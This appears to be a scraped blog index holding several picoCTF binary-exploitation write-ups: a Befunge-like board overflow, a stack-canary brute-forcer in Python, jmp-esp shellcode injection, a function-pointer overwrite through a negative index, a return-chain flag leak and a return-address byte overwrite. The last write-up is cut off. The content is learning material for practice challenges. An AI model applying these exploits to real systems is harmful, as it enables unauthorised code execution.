58.\n:: push 2; stack = [2, 2]\n+: pop a,b; push a+b; stack = [4]\n:: push 4; stack = [4, 4]\n:: push 4; stack = [4, 4, 4]\n*: pop a,b; push a*b; stack = [4, 16]\n*: pop a,b; push a*b; stack = [64]\nNow, since the - pushes stack[top-1] - stack[top], we need to push a 6 above the 64 in the stack.\n0: push 0; stack = [64, 0]\n!: pop; push 1; stack = [64, 1]\n:: push 1; stack = [64, 1, 1]\n+: pop a, b; push a+b; stack = [64, 2]\n:: push 2; stack = [64, 2, 2]\n:: push 2; stack = [64, 2, 2, 2]\n+: pop a, b; push a+b; stack = [64, 2, 4]\n+: pop a, b; push a+b; stack = [64, 6]\n-: pop a, b; push b-a; stack = [58]\n,: pop a, putchar(a); stack = []\n@: return 0;\nSo our payload would be 0!:+:+::**0!:+::++-,@. And it worked!\nA sad realisation This is the situation I wanted to reach. In the second board drawing, the direction gets set back by the \u0026lt;, and we repeat the : padding until we reach board[0] again. Theoretically, this should raise sn to ~277. Still not 392 but closer\u0026hellip;\n(Note from the future - I didn\u0026rsquo;t understand how board was being parsed yet - but more on that later - without using ^ or v we cannot switch rows)\nSince can never really tell when we reached the correct sn, what if we just print the stack top in every loop? We know what the flag is supposed to look like, so we can find it between the printed garbage values.\nWell, in a \u0026gt;.:\u0026lt; sequence what happens is:\nstack = [...data1, data2, data3, data4] memory = [...data1, data2, data3, data4, data 5, data 6...] \u0026#39;.\u0026#39;: stack = [...data1, data2, data3] print data4 memory = [...data1, data2, data3, data4, data 5, data 6...] \u0026#39;:\u0026#39;: stack = [...data1, data2, data3, data3] memory = [...data1, data2, data3, data3, data 5, data 6...] \u0026#39;.\u0026#39;: stack = [...data1, data2, data3] print data3 memory = [...data1, data2, data3, data3, data 5, data 6...] Well. Looks like we just overwrite the data, and we can only print data that we already overwrote. Would\u0026rsquo;ve been nice to realise this earlier.\nThe solution Since the most interesting/out-of-the-ordinary cases were\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3 elements it\u0026rsquo;s most likely that we are going to have to use them to solve the chall.\nHowever, we have face a bounds check, that requires:\n0\u0026lt;=stack[top]\u0026lt;=rows\n0\u0026lt;=stack[top-1]\u0026lt;=cols.\nThat means, the command executes even for stack[top] == rows and stack[top-1] == cols; That means we can edit the data at board[50][22]. But board is indexed from starting from 0, so that means that we have an extra row at our disposal! (50*22 + 22 is 1122).\nIn .bss, the data immediately after board, aka the data we can and are going to overflow, is rows, cols, dirx and pcx.\nThe useful ones are rows and cols, because they can completely break us out of that bound check. So first, let\u0026rsquo;s get stack[top] to 50. Then we can figure out the value we need to insert starting after board[1100].\nSince modifying rows would mean having to flip through a couple of different rows to output the flag, I\u0026rsquo;d rather opt for modifying cols.\nThat means 4 bytes after rows (board[1100]), is cols, So we should set stack[top-1] to 4.\nThe sequence that gets us 50 is 0!::+:++::+*, so that would be stack[top].\nSo what should we change cols to? The best idea would be to use\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements\nWhere board[stack[top]*22] + stack[top-1]] would be the first character of the flag, then use , to print it, and do the same for the next n characters of the flag, probably around 45.\nLet\u0026rsquo;s calculate the offset from board to flag:\nboard: 0x5260\nflag: 0x56E0\nSo 0x480 = 1152. And that\u0026rsquo;s the beginning of flag, so we would reach around 1197. That would mean we would need cols should be at around 100.\nAlright, so to set cols to somewhere a bit more than 100 then.\nThat is 0!::+:++::** for 125 (better safe than sorry).\nAfter fiddling a lot with inputs, it looks like the way step reads our board is a lot like the snake game, so we need to redirect it and change directions every time we switch rows. And all of them should be close in column-lengths.\nAs a fun fact, apparently this is based on Befunge, and I quote, a two-dimensional esoteric programming language invented in 1993 by Chris Pressey with the goal of being as difficult to compile as possible.\nWe need two rows of input:\n0!::+:++::** 0!:+ v #push 125, push 2, go to next row\n*+::++:+::!0 +: \u0026lt; #change movement to left, 2-\u0026gt;4, push 50\nWhen we go down one row, we need to change the direction of reading, so the second row is read from right to left.\nSo now stack looks like [125, 4, 50]. Let\u0026rsquo;s check if it works, and we modify rows.\nIt does push 125 to the stack, but the other values? ({ is 125)\nAlright, getting somewhere!\nLooking great!! Finally, we get confirmation we modified cols.\nNow let\u0026rsquo;s move onto the next row. p popped all of our values, so we need to push new ones.\ng: pushes board[stack[top]][stack[top-1]] onto stack top, pops top 2 elements\nstack[top] needs to be 50, and stack[top-1] needs to iterate from 125 to 52.\nThe Loop We need to print from board[1100 + 52] for the first character to board[1100 + 125] to the last. So logically we would need a loop for that. So, let\u0026rsquo;s create one using this language. If we just pad a line to the right and to left with the same direction character, \u0026gt; or \u0026lt;, it will keep going back to the other side of the row.\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;execute\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\nor\n\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;execute\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\nor something like\n\u0026gt; code here ......... v ^ other code here.... \u0026lt; This is my idea of solving this; But we would need to push a 50 to board[0][0] to have easy access to it later. The last thing we push in the stack in line 2 is a 50, so we might as well do it there.\nsince p: sets board[stack[top]][stack[top-1]] = (char) stack[top-2], popping off all 3, and we want to keep the 50 in the stack to overwrite cols, we can do the following:\n:: [125, 4, 50, 50]\n00: [125, 4, 50, 50, 0, 0]\np: [125, 4, 50] and board[0][0] = 50\nAnd after this we can resume overwriting cols.\np: board[50][4] = 125\nNow, we can start using g to fetch 50 in our loop. For simplicity, lets start with the first col 51.\n00: [0, 0]\ng : board[0][0]=50\nNow we can officially start the loop.\n0!+: [51] increment current stack top\n:: [51, 51]\n00: [51, 51, 0, 0]\ng: [51, 51, 50], board[50][51] -\u0026gt; stack top\ng: [51, char]\n,: [51] print(char)\nAnd now go back to increment.\nAnd I think I did it!\nNow testing remotely, fingers crossed\u0026hellip;\nIt actually worked! Yay! This is definitely my longest writeup yet, but I hope I covered everything on this, since it can definitely be very overwhelming for beginners.\nAs always, the rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/homework-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003e\u0026ldquo;time to do some \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/217\"\u003ehomework\u003c/a\u003e\u003c/strong\u003e!\u0026rdquo;\u003c/p\u003e\n\u003cp\u003eAt first glance, \u003cstrong\u003ehomework\u003c/strong\u003e looks like a 64-bit executable, but we can\u0026rsquo;t tell much about it.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/homework-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter using checksec, sadly, \u003ccode\u003ePIE\u003c/code\u003e is enabled and so is \u003ccode\u003eNX\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/homework-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe have a \u003ccode\u003emain\u003c/code\u003e function \u003cem\u003e(picture above)\u003c/em\u003e and a \u003ccode\u003estep\u003c/code\u003e function.\nThe \u003ccode\u003estep\u003c/code\u003e function uses and then modifies some variables declared/located in the \u003ccode\u003e.bss\u003c/code\u003e, so it would be good to see what they look like before execution starts.\u003c/p\u003e","title":"Pico Homework Writeup"},{"content":"Challenge overview Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.\nAt first glance, the vuln looks like a 32-bit executable, probably with a buffer overflow vulnerability.\nWe are first prompted to create a canary.txt file, and the binary runs after that.\nAnalyzing the binary, first, the read_canary() function is called, and then we go into vuln.\nThere\u0026rsquo;s also a win function included in the binary, so we don\u0026rsquo;t have to worry about getting a shell ourselves.\nSo, firstly, the read_canary() reads four bytes from canary.txt.\nAfter renaming some of the variables from vuln, it starts looking like this:\nWe see the call to sscanf, and looking at the C documentation for it, what it does is it takes the input from v as an integer, and stores it in \u0026amp;nbytes.\nThen, read(0, buf, nbytes) will read from the standard input (file descriptor 0), and write nbytesbytes from input intobuf`.\nAfter that, the binary checks if the canary has been modified.\nIdentifying the vulnerabilities Time for debugging with gef! I set a bp on the while(v_size \u0026lt;= 63) just to check if we got anything wrong.\nLooks like our buffer overflow worked!\nFor the first input being 123 and the content being an \u0026lsquo;A\u0026rsquo; buffer overflow, it sure does look like it worked!\nThe only issue is that the canary is also overwritten, so we need to take care of that now.\nThe global canary is saved in the .bss, and the stack canary is compared to that, to determine a whether stack smashing took place or not.\nThe canary example I chose is 0xebad3600, you can use zsh to write it into canary.txt like so:\necho -en \u0026#39;\\x00\\x36\\xad\\xeb\u0026#39; \u0026gt; canary.txt Here it\u0026rsquo;s comparing the global canary to our stack canary which is currently overwritten by a bunch of \u0026lsquo;A\u0026rsquo;s.\nSince the canary is static, taken from a canary.txt file, we might be able to simply bruteforce it, byte by byte.\nThe offset from the beginning of our input buffer to the canary is 0x40, so 64 in decimal.\nThe Canary Considering the challenge hint is Maybe there\u0026rsquo;s a smart way to brute-force the canary?, I\u0026rsquo;m guessing there\u0026rsquo;s more to it than just bruteforcing it. The global canary is in a rw zone, so maybe we can overwrite it?\nBut since it\u0026rsquo;s 4 bytes, and most likely the last byte is null, we could just bruteforce it. There are 16,777,216 possible combinations with 3 bytes.\nBut if we test byte-by-byte, we can lower this number monumentally. So, I opted for creating a canary_bruteforce() function to help us find the correct canary.\nI\u0026rsquo;m not familiar with bruteforcing canaries so I looked online to see if I can find a script to help with this, but most of them didn\u0026rsquo;t work.\nIn the end, the most helpful source was this writeup. I made my own canary_bruteforce() with similar logic, but I always opt for using and sending bytes rather than strings.\ndef canary_bruteforce(): canary= b\u0026#34;\u0026#34; for i in range(1, 5): for c in range(256): p=elf.process() p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) p.sendline(str(64+i)) p.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) payload = b\u0026#34;A\u0026#34;*64 + canary + bytes([c]) p.sendline(payload) result = p.recvall(timeout=0.2) if b\u0026#34;Stack\u0026#34; not in result: canary += bytes([c]) log.info(f\u0026#34;[+] Found: {canary.hex()}\u0026#34;) p.close() break p.close() return canary Testing it locally, we leak our canary and get the flag!\nAll that\u0026rsquo;s left to do is connect remotely and see if we can extract the actual flag. The first time I tried, it didn\u0026rsquo;t work, so I ended up having to increase the timeout from 0.2 to 1, and instead of p.recvuntil, p.sendline I used p.sendlineafter, and that worked!\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/bufferoverflow3-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eDo you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/306\"\u003ethis program\u003c/a\u003e\u003c/strong\u003e to protect against buffer overflows.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/bufferoverflow3-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable, probably with a buffer overflow vulnerability.\u003c/p\u003e\n\u003cp\u003eWe are first prompted to create a canary.txt file, and the binary runs after that.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/bufferoverflow3-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAnalyzing the binary, first, the \u003ccode\u003eread_canary()\u003c/code\u003e function is called, and then we go into \u003ccode\u003evuln\u003c/code\u003e.\u003c/p\u003e","title":"Pico Buffer Overflow 3 Writeup"},{"content":"Challenge overview What\u0026rsquo;s ROP? Can you exploit the following program to get the flag?\nAt first glance, the vuln looks like a 32-bit executable with a buffer overflow vulnerability.\nIdentifying the vulnerabilities Analyzing the binary, it doesn\u0026rsquo;t look like anything special, just an ordinary buffer overflow.\nWe don\u0026rsquo;t seem to have a /bin/sh in memory so this probably means we have to execute a ret2reg.\nThat means we need to make our own bin/sh and point to it, and since the vuln returns the gets, that means eax will hold the gets return value. And the return value of gets is a pointer to the input value!\nThis is because eax/rax usually holds the current function\u0026rsquo;s return value.\nWould you look at that, no NX! So we can execute the code right on the stack! Since we have a large enough overflow (28 bytes), we don\u0026rsquo;t need to worry getting a shell.\nThat means we can just get a jmp eax gadget, and write our shellcraft.sh() at the start the input buffer.\nThe Exploit Well, looks like we need to write the shellcode ourselves, shellcraft.sh() was too large after all\u0026hellip;\nI tried a bunch of shellcode that kept getting me segmentation faults, that I won\u0026rsquo;t include, and I tried fitting it all in our buffer before the jmp eax gadget, and I managed to get all the registers required right (for execve, ebx needs to be a pointer to /bin/sh, and ecx and edx need to be 0)\nAfter I set the address after eip, eip+4, to be a null-terminated /bin/sh, I noticed esp would become that value.\nSo, I tried doing\nmov ebx, esp xor ecx, ecx xor edx, edx mov al, 0x0b int 0x80 And my mistake was most likely that I messed with the stack frame, since execve kept returning error 0xffffff74 = -140 = ERFAULT.\nBut then I thought, if after the jmp eax the value at eip+4 goes into esp, why don\u0026rsquo;t we write the shellcode in eip+4, then just jmp esp to said shellcode?\nThat way, we can just use shellcraft.sh(), since we have unlimited space.\nSince jmp esp is just 2 bytes, we pad with 26 more nops to its left.\npayload = b\u0026#39;\\x90\u0026#39;*26 payload += asm(\u0026#39;jmp esp\u0026#39;) payload += jmp_eax #this will become esp after we execute jmp eax. newshell = asm(shellcraft.sh()) payload += newshell And it works!\nThe rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/ropfu-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eWhat\u0026rsquo;s ROP? Can you exploit the following \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/292\"\u003eprogram\u003c/a\u003e\u003c/strong\u003e to get the flag?\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ropfu-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable with a buffer overflow vulnerability.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerabilities\"\u003eIdentifying the vulnerabilities\u003c/h2\u003e\n\u003cp\u003eAnalyzing the binary, it doesn\u0026rsquo;t look like anything special, just an ordinary buffer overflow.\u003c/p\u003e\n\u003cp\u003eWe don\u0026rsquo;t seem to have a \u003ccode\u003e/bin/sh\u003c/code\u003e in memory so this probably means we have to execute a ret2reg.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/ropfu-writeup/pic3.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eThat means we need to make our own \u003ccode\u003ebin/sh\u003c/code\u003e and point to it, and since the \u003ccode\u003evuln\u003c/code\u003e \u003cem\u003ereturns\u003c/em\u003e the \u003ccode\u003egets\u003c/code\u003e, that means \u003ccode\u003eeax\u003c/code\u003e will hold the \u003ccode\u003egets\u003c/code\u003e return value. And the return value of \u003ccode\u003egets\u003c/code\u003e is a pointer to the input value!\u003c/p\u003e","title":"Pico Ropfu Writeup"},{"content":"Challenge overview Story telling class 2/2 Additional details will be available after launching your challenge instance.\nUpon a quick check, we see that the challenge is a 32-bit binary, and that we can trigger a SEGFAULT. It might be a buffer overflow, but the challenge doesn\u0026rsquo;t necessarily hint that, so let\u0026rsquo;s inspect it further.\nAlso NX is enabled, so let\u0026rsquo;s keep that in mind.\nThe first input string is not susceptible to a buffer overflow, but something interesting happens on the second scanf. We read two %d (ints), but only one destination for them (\u0026amp;number1).\nWe also have another couple of functions, hard_checker, easy_checker and calculate_story_score.\nThe check in easy_checker:\nif ( calculate_story_score(input, input_size) != 1337 ) return printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); The check in hard_checker:\nif ( calculate_story_score(input, input_size) != 13371337 ) return printf(\u0026#34;You\u0026#39;ve failed this class.\u0026#34;); And the calculate_story_score they both use:\nNow, inspecting with gef, let\u0026rsquo;s see where all of our values end up. For input='inputexample', nr1=7 (so it satisfies the first check) and nr2='testing'), it looks like input is being placed on the stack while the second number is getting placed on the heap.\nThe functions we stepped into were hard_checker and then calculate_story_score, so no easy_checker.\nWhat calculate_story_score does is it sums all of the ASCII characters inside our input string.\nFor our inputexample string, the output should be\nsum = 105 + 110 + 112 + 117 + 116 + 101 + 120 + 97 + 109 + 112 + 108 + 101 So, 1308. Setting a breakpoint on the return of calculate_story_score, we can see the value right there on the stack! (0x51c = 1308)\nAnd here it is, checking if it\u0026rsquo;s equal to 13371337:\nIdentifying the vulnerability So, we need to find a string that has the sum of its ASCII characters equal to 13371337. But that\u0026rsquo;s quite a big number, isn\u0026rsquo;t it? And we only have 127 bytes available.\nChars go from 0-255, so our best case scenario would be 127*255, so 32385. Not even close to 13371337 is it?\nWe could either find a way to go into easy_checker instead, or find another way to raise our sum.\nSince the challenge hint was Don\u0026rsquo;t be so negative, I\u0026rsquo;m going to assume there\u0026rsquo;s a way to integer overflow or something else to allow us to reach that number.\nOne thing we haven\u0026rsquo;t handled yet is the two numbers. What bothers me are these lines of code:\nif ( numbers \u0026lt;= 9 ) fun[number1] += v3; After trying with two numbers, (78 and 78), we can see they\u0026rsquo;re still placed in the stack and the heap respectively (I thought the second one might\u0026rsquo;ve ended up on the heap because I gave it too large a value, but it wasn\u0026rsquo;t the case).\nDebugging Detour Before actually figuring out how to solve this challenge, I wasted a surprising amount of time due to a small mistake, which is that I kept using a string value for the second %d argument. Since scanf(\u0026quot;%d\u0026quot;) interprets 4-byte integers, my string \u0026quot;testing\u0026quot; became some random hex bytes that I misinterpreted as something hardcoded.\nBecause of that, I spent a lot of time trying to find ways to overwrite the ASCII sum, manipulate the comparison instruction, overwrite .rodata, or patch return addresses, so a couple of hours in gef and a lot of SEGFAULTS. Turns out the specific hex value was literally just the second integer, which I had broken it myself by feeding it a string.\nAnd also the challenge had nothing to do with the heap either.\nSo maybe the lesson to be learned is to be a lot more careful with \u0026ldquo;testing\u0026rdquo; input values.\nThe exploit Let\u0026rsquo;s take a look at the assembly code for this if:\nmov eax, [ebp+number1] #eax = number1 mov ecx, ds:(fun - 804C000h)[ebx+eax*4] #ecx = fun[number1] mov edx, [ebp+var_90] # edx = number2 mov eax, [ebp+number1] # eax = numbers add edx, ecx # edx += ecx mov ds:(fun - 804C000h)[ebx+eax*4], edx # fun[number1] = edx Or more simply put,\nfun_table[number1 * 4] += number2; Here we can see number2 getting loaded into edx. And ebx + 0x80 is just the address of fun.\nHere is fun in .data, located at 0804C080.\nAnother interesting thing was how the hard_checker function was called:\nv0 = check; return v0((int)input, input_size); Where check holds the address of hard_checker: 0x804c040 \u0026lt;check\u0026gt;: 0x08049436\nAnd guess what, check is, just like fun, located in the .rodata!\nSince the condition in hard_checker was sum == 13371337, which is impossibe to reach, and we have a similar function called easy_checker that presents us with a much more attainable sum == 1337, we can already guess we are supposed to somehow modify the address in check from hard_checker to easy_checker.\nSince we can choose a negative [numbers] index, we can modify data out of bounds to control the value of check.\nDouble checking with vmmap, the area is rw, so we can modify values!\n0x0804c000 0x0804d000 0x00003000 rw- /home/kali/Downloads/vuln\nOkay, so\nfun - check is 0x804C080 - 0x804C040,\nwhich is 0x40.\nSince we need to modify fun[-0x40], that meansnumber1*4 should be -0x40 = -64. So we already figured out number1 = -16.\nTaking care of the sum, our inputexample was already close to 1337. 1337 - 1308 = 29, so instead of e (101 ASCII) I added two A\u0026rsquo;s (65+65 = 101 +29).\nNow, to figure out number2, we just need to calculate the offset between hard_checker and easy_checker.\nhard_checker : 0x08049436\neasy_checker : 0x80492FC\nSo out offset is -0x13A, -314 in hex.\nAnd we\u0026rsquo;re done!\nThe rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/functionoverwrite-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eStory telling class 2/2\nAdditional details will be available after launching your \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/272\"\u003echallenge instance\u003c/a\u003e\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/functionoverwrite-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eUpon a quick check, we see that the challenge is a \u003ccode\u003e32-bit\u003c/code\u003e binary, and that we can trigger a \u003ccode\u003eSEGFAULT\u003c/code\u003e. It might be a buffer overflow, but the challenge doesn\u0026rsquo;t necessarily hint that, so let\u0026rsquo;s inspect it further.\u003c/p\u003e\n\u003cp\u003eAlso NX is enabled, so let\u0026rsquo;s keep that in mind.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/functionoverwrite-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eThe first input string is not susceptible to a buffer overflow, but something interesting happens on the second \u003ccode\u003escanf\u003c/code\u003e. We read two \u003ccode\u003e%d\u003c/code\u003e (ints), but only one destination for them (\u003ccode\u003e\u0026amp;number1\u003c/code\u003e).\u003c/p\u003e","title":"Pico Function Overwrite Writeup"},{"content":"Challenge overview Undefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse this program to identify how you can get to the flag.\nAt first glance, the vuln looks like a 32-bit executable with a buffer overflow vulnerability.\nAnalyzing the binary, we come across some interesting funtions, UnderConstruction and win.\nAfter a quick checksec, we find vuln has both NX and a stack canary enabled. So we can probably find a way to leak the stack canary using the UnderConstruction function.\nIdentifying the vulnerabilities We can easily buffer overflow (the offset I used was 14 of \\x90 padding and then I set the new eip as 0x8049E10, the beginning of UnderConstruction) into UnderConstruction, and we get a bunch of leaks:\nIt doesn\u0026rsquo;t seem like the stack canary is very effective. If we overwrite eip with the win function, it does indeed enter win, but no flag seems to be getting printed. Let\u0026rsquo;s analyze it further:\nAha! So if we look closely, what this does is it saves the flag in the stack, and if the flag array is null, it executes a _printf(%s %s);.\nIn my case, I have a flag.txt file created locally, so it doesn\u0026rsquo;t really output anything at all. What it does do though, is save the flag in the stack (also hinted by the challenge name, stack cache).\nWe can see the content of flag.txt being pushed on the stack.\nThe next logical step is making it so that the function called after win is UnderConstruction. We can do this without much hassle since we are working on a 32-bit executable, so no need to work with registers.\nThe stack alignment for 32-bit is function, parameters, return address and since these functions don\u0026rsquo;t need any params we can easily chain a bunch of functions.\npayload = b\u0026#39;\\x90\u0026#39;*14 payload += p32(0x8049D90) #win payload += p32(0x8049E10) #under constr devine ret addr la win payload += p32(0x8049E10) #a bunch of undr constr to leak the flag payload += p32(0x8049E10) #to get a bunch of %p \u0026#39;s payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049EB0) #main Since I wanted to make sure that we would get all of the flag, not just a part of it, since pico flags are usually pretty long, I chained a lot of UnderConstruction functions together.\nAnd lo and behold! Dumping this into CyberChef, we can see the content of the flag is being shown on the stack, separated into 4 byte chunks with reversed bit order.\nAll that\u0026rsquo;s left to do is connect remotely and see if we can extract the flag.\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/stackcache-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eUndefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/306\"\u003ethis program\u003c/a\u003e\u003c/strong\u003e to identify how you can get to the flag.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stackcache-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable with a buffer overflow vulnerability.\u003c/p\u003e\n\u003cp\u003eAnalyzing the binary, we come across some interesting funtions, \u003ccode\u003eUnderConstruction\u003c/code\u003e and \u003ccode\u003ewin\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stackcache-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter a quick \u003ccode\u003echecksec\u003c/code\u003e, we find vuln has both NX and a stack canary enabled.\nSo we can probably find a way to leak the stack canary using the \u003ccode\u003eUnderConstruction\u003c/code\u003e function.\u003c/p\u003e","title":"Pico Stack Cache Writeup"},{"content":"Challenge overview Break the game and get the flag. Welcome to BabyGame 02! Navigate around the map and see what you can find!\nAfter analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x.\nImmediately after that, we have the map matrix.\nFrom the main function, by solving the puzzle, which can be easily achieved by using the special command p we \u0026ldquo;win\u0026rdquo;. And with the special command l we can replace the @ player character with a char (spoiler, it can be any byte of our liking, not necessarily a char).\nIdentifying the vulnerabilities What is most likely the vulnerability is that there is no bounds check for the map, and that we can overwrite the variables on the stack by modifying one byte.\nMore precisely, using our player, and moving it out of bounds will allow us to modify the byte at position\nplayer_x + map + 90 * player_y where map is the location of the map buffer on the stack.\nWe notice a win function, so all we need to do is find a way to jump into win. Using the file command, we can see that game is a 32-bit executable, so all the function parameters are stored on the stack.\nProbably so is the return to main inside move_player, so we can set a breakpoint on its return.\nThere is no stack canary or PIE, so nothing that we need to worry about.\nAnd there it is!\nUsing hexdump with GEF, we can analyze the offset from the beginning of map to our return address (the first 0x2e being the first dot inside map). The offset seems to be 39.\nTo modify the return address we need to find a position in win that is one byte away from 0x08049709.\nFor example, 0x804975D works perfectly! So all we need to do is overwrite its LSB 09 with 5D.\nWe can easily achieve this by using the l command. So first, modify it our player to \\x5D, then we move to position map - 39.\nplayer_x + map + 90 * player_y = map - 39\nOne way to solve this is player_x = -39 and player_y = 0. To not mess with other values on the stack that might crash our program, we could first go up to player_y=-2, go to the right player_x, then go back down to player_y=0.\np.recvuntil(b\u0026#39;X\\n\u0026#39;) p.sendline(b\u0026#39;l\u0026#39;+b\u0026#39;\\x5D\u0026#39;) p.recvuntil(b\u0026#39;X\\n\u0026#39;) p.sendline(b\u0026#39;w\u0026#39;*4 + b\u0026#39;a\u0026#39;*4 + b\u0026#39;w\u0026#39;*2 +b\u0026#39;a\u0026#39;*39+b\u0026#39;s\u0026#39;*2) Some problems\u0026hellip; It seems to be working fine locally, but remotely we stumble upon another issue.\nAnd then another issue?\nIn these kinds of situations, what happens is some things get aligned differently, so the best thing to do is try other addresses near what we found.\nThe first one I found that works is \\x60, and with that we get the flag!\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/babygame02-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eBreak the game and get the flag. Welcome to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/346\"\u003eBabyGame 02\u003c/a\u003e\u003c/strong\u003e! Navigate around the map and see what you can find!\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame02-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter analyzing the binary and renaming the variables, we notice we have a \u003cstrong\u003eplayer struct/array\u003c/strong\u003e consisting of the \u003cstrong\u003eplayer y\u003c/strong\u003e, \u003cstrong\u003eplayer x\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eImmediately after that, we have the \u003cstrong\u003emap matrix\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame02-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eFrom the \u003ccode\u003emain\u003c/code\u003e function, by solving the puzzle, which can be easily achieved by using the special command \u003ccode\u003ep\u003c/code\u003e we \u0026ldquo;win\u0026rdquo;. And with the special command \u003ccode\u003el\u003c/code\u003e we can replace the \u003ccode\u003e@\u003c/code\u003e player character with a char (spoiler, it can be any byte of our liking, not necessarily a char).\u003c/p\u003e","title":"Pico Babygame02 Writeup"},{"content":"Challenge overview Break the game and get the flag. Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don\u0026rsquo;t have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you\u0026rsquo;ll have to figure your way around the map.\nAfter analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x and player lives.\nImmediately after that, we have the map matrix.\nWe immediately run intos a couple of problems. We need to reach level 5 to win and to print the flag (image below), but we cannot move past level 4 because of the if condition inside of the while.\nFirst, let’s worry about getting up to level 4. We notice that we have a couple of special commands inside the move_player function, Such as p to solve the level and l to change the current playertile from 